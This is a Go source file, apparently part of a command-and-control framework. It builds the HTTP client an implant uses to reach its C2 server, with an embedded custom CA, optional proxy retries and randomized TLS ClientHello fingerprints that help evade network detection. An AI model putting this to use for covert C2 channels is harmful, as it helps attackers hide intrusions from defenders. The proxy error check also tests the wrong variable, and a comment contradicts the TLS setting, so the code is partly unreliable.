package tun

import (
	"log"
	"net/http"
	"net/url"
	"time"

	utls "github.com/refraction-networking/utls"
)

// CACrt for TLS server cert signing
var CACrt = []byte("")

// EmpHTTPClient add our CA to trusted CAs, while keeps TLS InsecureVerify on
func EmpHTTPClient(c2_addr, proxyServer string) *http.Client {
	// Extract CA bundle from built-in certs
	rootCAs, err := ExtractCABundle()
	if err != nil {
		LogFatalError("ExtractCABundle: %v", err)
	}

	// C2 URL
	c2url, err := url.Parse(c2_addr)
	if err != nil {
		LogFatalError("Error parsing C2 address '%s': %v", c2_addr, err)
	}

	// add our cert
	if ok := rootCAs.AppendCertsFromPEM(CACrt); !ok {
		LogFatalError("No CA certs appended")
	}

	// Trust the augmented cert pool in our TLS client
	c2_host := c2url.Hostname()
	config := &utls.Config{
		ServerName:         c2_host,
		InsecureSkipVerify: false,
		RootCAs:            rootCAs,
	}

	// fingerprint of CA
	ca_crt, _ := ParsePem(CACrt)
	log.Printf("CA cert fingerprint: %s", SHA256SumRaw(ca_crt.Raw))

	// set proxyURL to nil to use direct connection for C2 transport
	proxyDialer, _ := makeProxyDialer(nil, config, clientHelloIDMap["hellorandomizedalpn"])
	if proxyServer != "" {
		// use a proxy for our HTTP client
		proxyUrl, e := url.Parse(proxyServer)
		if err != nil {
			LogFatalError("Invalid proxy: %v", e)
		}

		proxyDialer, _ = makeProxyDialer(proxyUrl, config, clientHelloIDMap["hellorandomizedalpn"])
	}

	// transport of our http client, with configured TLS client
	try := 0
init_transport:
	tr, err := makeTransport(c2url, clientHelloIDMap["hellorandomizedalpn"], config, proxyDialer)
	try++
	if err != nil {
		if proxyServer != "" && try < 5 {
			time.Sleep(3 * time.Second)
			log.Printf("Proxy server down, retrying (%d)...", try)
			goto init_transport
		} else {
			log.Printf("Initializing transport (%s): makeRoundTripper: %v", c2url, err)
			return nil
		}
	}

	return &http.Client{Transport: tr}
}

// HTTPClientWithEmpCA is a http client with system CA pool
// with utls client hello randomization
// url: target URL, proxy: proxy URL
func HTTPClientWithEmpCA(target_url, proxy string) (client *http.Client) {
	client = EmpHTTPClient(target_url, proxy)
	if client == nil {
		return nil
	}

	client.Timeout = 5 * time.Second
	return
}
